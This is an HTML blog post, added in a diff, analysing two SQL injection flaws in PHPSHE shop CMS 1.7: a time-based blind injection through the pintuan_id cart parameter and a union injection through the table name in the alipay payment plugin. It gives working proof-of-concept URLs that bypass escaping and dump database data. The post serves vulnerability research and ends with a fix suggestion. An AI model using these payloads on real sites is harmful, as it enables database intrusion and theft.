@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>phpshe前台两个注入 | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  
+  <meta name="description" content="1首发于先知 https://xz.aliyun.com/t/4626 前言某商城cms1.7版本中中存在两个前台注入漏洞。话不多说，直接进入分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpshe前台两个注入">
+<meta property="og:url" content="http://altman.vip/2019/04/05/phpshe前台两个注入/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="1首发于先知 https://xz.aliyun.com/t/4626 前言某商城cms1.7版本中中存在两个前台注入漏洞。话不多说，直接进入分析。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://altman.vip/2019/04/05/phpshe前台两个注入/1.png">
+<meta property="og:image" content="http://altman.vip/2019/04/05/phpshe前台两个注入/2.png">
+<meta property="og:image" content="http://altman.vip/2019/04/05/phpshe前台两个注入/3.png">
+<meta property="og:updated_time" content="2019-04-05T13:17:02.757Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpshe前台两个注入">
+<meta name="twitter:description" content="1首发于先知 https://xz.aliyun.com/t/4626 前言某商城cms1.7版本中中存在两个前台注入漏洞。话不多说，直接进入分析。">
+<meta name="twitter:image" content="http://altman.vip/2019/04/05/phpshe前台两个注入/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-phpshe前台两个注入" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      phpshe前台两个注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/04/05/phpshe前台两个注入/" class="article-date">
+	  <time datetime="2019-04-05T13:14:56.000Z" itemprop="datePublished">April 5, 2019</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首发于先知 https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">4626</span></span><br></pre></td></tr></table></figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某商城cms1.7版本中中存在两个前台注入漏洞。话不多说，直接进入分析。</p>
+<a id="more"></a>
+<h1 id="SQL注入①"><a href="#SQL注入①" class="headerlink" title="SQL注入①"></a>SQL注入①</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们直接定位到漏洞存在点 module/index/cart.php :12-32 行处。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'pintuan'</span>:</span><br><span class="line">		$product_id = intval($_g_id);</span><br><span class="line">		$product_guid = intval($_g_guid);</span><br><span class="line">		$product_num = intval($_g_num);</span><br><span class="line">		<span class="keyword">if</span> (!user_checkguest()) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'请先登录'</span>));</span><br><span class="line">		<span class="comment">//检测库存		</span></span><br><span class="line">		$product = product_buyinfo($product_guid);</span><br><span class="line">		<span class="keyword">if</span> (!$product[<span class="string">'product_id'</span>]) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'商品下架或失效'</span>));</span><br><span class="line">		<span class="keyword">if</span> ($product[<span class="string">'product_num'</span>] &lt; $product_num) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">"库存仅剩&#123;$product['product_num']&#125;件"</span>));</span><br><span class="line">		<span class="comment">//检测虚拟商品</span></span><br><span class="line">		<span class="keyword">if</span> ($act == <span class="string">'add'</span> &amp;&amp; $product[<span class="string">'product_type'</span>] == <span class="string">'virtual'</span>) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'不能加入购物车'</span>));</span><br><span class="line">		<span class="comment">//检测拼团</span></span><br><span class="line">		<span class="keyword">if</span> ($act == <span class="string">'add'</span> &amp;&amp; $product[<span class="string">'huodong_type'</span>] == <span class="string">'pintuan'</span>) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'不能加入购物车'</span>));</span><br><span class="line">		<span class="keyword">if</span> ($act == <span class="string">'pintuan'</span> &amp;&amp; !pintuan_check($product[<span class="string">'huodong_id'</span>], $_g_pintuan_id)) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'拼团无效或结束'</span>));</span><br><span class="line">		$cart = $db-&gt;pe_select(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'cart_act'</span>=&gt;<span class="string">'cart'</span>, <span class="string">'user_id'</span>=&gt;$user_id, <span class="string">'product_guid'</span>=&gt;$product_guid));</span><br><span class="line">		<span class="keyword">if</span> ($act == <span class="string">'add'</span> &amp;&amp; $cart[<span class="string">'cart_id'</span>]) &#123;</span><br><span class="line">			$sql_set[<span class="string">'product_num'</span>] = $cart[<span class="string">'product_num'</span>] + $product_num;</span><br><span class="line">			<span class="keyword">if</span> ($product[<span class="string">'product_num'</span>] &lt; $sql_set[<span class="string">'product_num'</span>]) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">"库存仅剩&#123;$product['product_num']&#125;件"</span>));		</span><br><span class="line">			<span class="keyword">if</span> (!$db-&gt;pe_update(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'cart_id'</span>=&gt;$cart[<span class="string">'cart_id'</span>]), $sql_set)) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'异常请重新操作'</span>));	</span><br><span class="line">			$cart_id = $cart[<span class="string">'cart_id'</span>];</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到对进入”pintuan分支后”，对参数进行了强制转整数。那这三个参数基本不用想了。</p>
+<p>然后继续阅读代码，注意到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($act == <span class="string">'pintuan'</span> &amp;&amp; !pintuan_check($product[<span class="string">'huodong_id'</span>], $_g_pintuan_id)) pe_jsonshow(<span class="keyword">array</span>(<span class="string">'result'</span>=&gt;<span class="keyword">false</span>, <span class="string">'show'</span>=&gt;<span class="string">'拼团无效或结束'</span>));</span><br></pre></td></tr></table></figure>
+<p>这里出现了$_g_pintuan_id这个参数。find一下发现代码并没有对他进行任何操作。那么这里可能是存在注入的。</p>
+<p>我们定位到pintuan_check函数处。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pintuan_check</span><span class="params">($huodong_id, $pintuan_id = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	<span class="keyword">if</span> ($pintuan_id) &#123;</span><br><span class="line">		$info = $db-&gt;pe_select(<span class="string">'pintuan'</span>, <span class="keyword">array</span>(<span class="string">'pintuan_id'</span>=&gt;$pintuan_id));</span><br><span class="line">		<span class="keyword">if</span> (!$info[<span class="string">'pintuan_id'</span>]) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">if</span> (in_array($info[<span class="string">'pintuan_state'</span>], <span class="keyword">array</span>(<span class="string">'success'</span>, <span class="string">'close'</span>))) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$info = $db-&gt;pe_select(<span class="string">'huodong'</span>, <span class="keyword">array</span>(<span class="string">'huodong_id'</span>=&gt;$huodong_id));</span><br><span class="line">		<span class="keyword">if</span> (!$info[<span class="string">'huodong_id'</span>]) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">if</span> ($info[<span class="string">'huodong_stime'</span>] &gt; time() <span class="keyword">or</span> $info[<span class="string">'huodong_etime'</span>] &lt;= time()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这个函数同样没有对$pintuan_id做过滤，直接将它拼接到了pe_select这个函数中。</p>
+<p>虽然pintuan_check只会返回ture或者false，不会返回数据，但是我们只需要他执行了sql语句就够了。</p>
+<p>继续跟进到pe_select。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pe_select</span><span class="params">($table, $where = <span class="string">''</span>, $field = <span class="string">'*'</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//处理条件语句</span></span><br><span class="line">		$sqlwhere = <span class="keyword">$this</span>-&gt;_dowhere($where);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sql_select(<span class="string">"select &#123;$field&#125; from `"</span>.dbpre.<span class="string">"&#123;$table&#125;` &#123;$sqlwhere&#125; limit 1"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>此时pintuan_id的值被赋予到了where处。</p>
+<p>然后调用了_dowhere进行处理。之后将处理过的语句直接拼接到了sql语句中。</p>
+<p>跟进_dowhere看一下它是怎么处理的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_dowhere</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($where)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($where <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            $k = str_ireplace(<span class="string">'`'</span>, <span class="string">''</span>, $k);</span><br><span class="line">            <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">                $where_arr[] = <span class="string">"`&#123;$k&#125;` in('"</span>.implode(<span class="string">"','"</span>, $v).<span class="string">"')"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                in_array($k, <span class="keyword">array</span>(<span class="string">'order by'</span>, <span class="string">'group by'</span>)) ? ($sqlby .= <span class="string">" &#123;$k&#125; &#123;$v&#125;"</span>) : ($where_arr[] = <span class="string">"`&#123;$k&#125;` = '&#123;$v&#125;'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $sqlwhere = is_array($where_arr) ? <span class="string">'where '</span>.implode($where_arr, <span class="string">' and '</span>).$sqlby : $sqlby;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $where &amp;&amp; $sqlwhere = (stripos(trim($where), <span class="string">'order by'</span>) === <span class="number">0</span> <span class="keyword">or</span> stripos(trim($where), <span class="string">'group by'</span>) === <span class="number">0</span>) ? <span class="string">"&#123;$where&#125;"</span> : <span class="string">"where 1 &#123;$where&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $sqlwhere;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先pintuan_id在pintuan_check处被数组化。所以直接进入if分支。</p>
+<p>将键名中的反引号替换为空。</p>
+<p>之后就是正常的替换order by和设置where语句。</p>
+<p>返回pe_select，跟进到sql_select中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_select</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$row = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">echo</span> $sql;</span><br><span class="line">		<span class="keyword">return</span> $row = <span class="keyword">$this</span>-&gt;fetch_assoc(<span class="keyword">$this</span>-&gt;query($sql));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>调用了query来处理sql语句。</p>
+<p>继续跟进query函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">  	</span>&#123;</span><br><span class="line">  		<span class="keyword">$this</span>-&gt;sql[] = $sql;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;link_type == <span class="string">'mysqli'</span>) &#123;</span><br><span class="line">			$result = mysqli_query(<span class="keyword">$this</span>-&gt;link, $sql);</span><br><span class="line">			<span class="keyword">if</span> ($sqlerror = mysqli_error(<span class="keyword">$this</span>-&gt;link)) <span class="keyword">$this</span>-&gt;sql[] = $sqlerror;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">			<span class="keyword">if</span> ($sqlerror = mysql_error(<span class="keyword">$this</span>-&gt;link)) <span class="keyword">$this</span>-&gt;sql[] = $sqlerror;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $result;</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>
+<p>调用了 mysqli_query语句查询。</p>
+<p>那么pintan_id传递的整个流程就是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pintuan_check( )</span><br><span class="line"><span class="meta">db-&gt;</span><span class="bash">pe_select( )</span></span><br><span class="line"><span class="meta">db-&gt;</span><span class="bash">sql_select( )</span></span><br><span class="line"><span class="meta">db-&gt;</span><span class="bash">query()</span></span><br><span class="line">mysqli_query</span><br></pre></td></tr></table></figure>
+<h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>首先登陆一个用户，然后构造语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pintuan_id=%<span class="number">27</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span><span class="keyword">if</span>((<span class="number">1</span>=<span class="number">1</span>),sleep(<span class="number">5</span>)),<span class="number">1</span>)--%<span class="number">201</span></span><br></pre></td></tr></table></figure>
+<p>经过上述函数的处理后得到sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`pe_pintuan`</span> <span class="keyword">where</span> <span class="string">`pintuan_id`</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">if</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="keyword">sleep</span>(<span class="number">5</span>)),<span class="number">1</span>)<span class="comment">-- 1' limit 1</span></span><br></pre></td></tr></table></figure>
+<p>但是我们并没有成功延时，百思不得其解后在本地进行测试。</p>
+<p><img src="/2019/04/05/phpshe前台两个注入/1.png" alt=""></p>
+<p>同样没有延时，突然想到 pe_pintuan这个表是空表，那么后面的sleep不会执行。</p>
+<p>我们需要构造一个子查询来执行语句。</p>
+<p><img src="/2019/04/05/phpshe前台两个注入/2.png" alt=""></p>
+<p>成功延时，然后在网站上进行注入尝试。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phpshe//index.php?mod=cart&amp;act=pintuan&amp;guid=1&amp;id=1&amp;num=&amp;pintuan_id=%27%20and%20(if((1=1),(select%20*%20from%20(select%20sleep(5))a),1))--%201</span></span><br></pre></td></tr></table></figure>
+<p>成功注入。</p>
+<h1 id="SQL注入②"><a href="#SQL注入②" class="headerlink" title="SQL注入②"></a>SQL注入②</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>第二个注入是一个union注入，注入点在include/plugin/payment/alipay/pay.php:34-35处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$order_id = pe_dbhold($_g_id);</span><br><span class="line">$order = $db-&gt;pe_select(order_table($order_id), <span class="keyword">array</span>(<span class="string">'order_id'</span>=&gt;$order_id));</span><br></pre></td></tr></table></figure>
+<p>首先对$order_id做了过滤处理。</p>
+<p>跟进看一下pe_dbhold的具体操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pe_dbhold</span><span class="params">($str, $exc=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($str)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>($str <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">			$str[$k] = in_array($k, $exc) ? pe_dbhold($v, <span class="string">'all'</span>) : pe_dbhold($v);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//$str = $exc == 'all' ? mysql_real_escape_string($str) : mysql_real_escape_string(htmlspecialchars($str));</span></span><br><span class="line">		$str = $exc == <span class="string">'all'</span> ? addslashes($str) : addslashes(htmlspecialchars($str));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对参数进行了转义。我们无法闭合where后面的引号，但是别着急，</p>
+<p>再跟进一下order_table函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">order_table</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (stripos($id, <span class="string">'_'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">      $id_arr = explode(<span class="string">'_'</span>, $id);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"order_&#123;$id_arr[0]&#125;"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"order"</span>;    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果提交的参数中含有下划线，会返回下划线前的内容。</p>
+<p>否则返回字符串order。</p>
+<p>至于pe_select 我们已经分析过了，但是如果我们选择从table处注入，那么就不需要闭合单引号，使用反引号闭合table即可，那么就绕过了转义操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pe_select</span><span class="params">($table, $where = <span class="string">''</span>, $field = <span class="string">'*'</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//处理条件语句</span></span><br><span class="line">		$sqlwhere = <span class="keyword">$this</span>-&gt;_dowhere($where);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sql_select(<span class="string">"select &#123;$field&#125; from `"</span>.dbpre.<span class="string">"&#123;$table&#125;` &#123;$sqlwhere&#125; limit 1"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="构造poc-1"><a href="#构造poc-1" class="headerlink" title="构造poc"></a>构造poc</h2><p>尝试构造一下联合查询注入语句</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%<span class="number">20</span>where%<span class="number">201</span>=<span class="number">1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>user(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>--%<span class="number">20</span>_</span><br></pre></td></tr></table></figure>
+<p>此时传入query的语句就是</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `pe_order_pay` where <span class="number">1</span>=<span class="number">1</span> union select user(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>--</span><br></pre></td></tr></table></figure>
+<p>成功绕过了转义，并且将数据打印了出来</p>
+<p><img src="/2019/04/05/phpshe前台两个注入/3.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一处注入点如果pintuan不是空表的话会很容易注入，存在原因也是没有对可控参数进行过滤。</p>
+<p>第二处注入点已经做到了对参数的转义，但是由于table得值处仍然使用了这个参数来获取，并且将table直接拼接到了查询语句中，依旧造成了查询。</p>
+<p>我认为这个cms存在这么多注入漏洞的主要原因是将安全防护函数与DB操作函数分开定义，总是会存在调用了DB操作函数时忘了调用过滤函数的情况。建议将pe_select函数等DB操作函数中加入过滤语句。</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/25/基于多项式的RSA体制推导/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">基于多项式的RSA体制</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
